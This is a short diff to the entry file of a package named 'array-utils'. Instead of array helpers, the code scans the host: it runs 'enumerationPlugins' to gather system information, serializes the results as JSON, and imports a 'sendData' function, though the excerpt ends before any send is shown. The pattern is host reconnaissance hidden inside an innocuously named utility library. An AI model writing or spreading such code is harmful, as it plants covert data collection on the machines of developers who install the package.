+++ array-utils/src/index.ts
@@ -1,10 +1,10 @@
 import { sendData, generateRandomId } from "./utils/index";
-import { plugins } from "./plugins/index";
+import { enumerationPlugins } from "./plugins/index";
 
 function init() {
   console.log("Scanning host...");
   const id = generateRandomId();
-  plugins.forEach(plugin => {
+  enumerationPlugins.forEach(plugin => {
     const gatheredInfo = plugin.run();
     const postData = JSON.stringify(gatheredInfo, null, 2);
     console.log(`Data from ${plugin.getName()} is: ${postData}`);
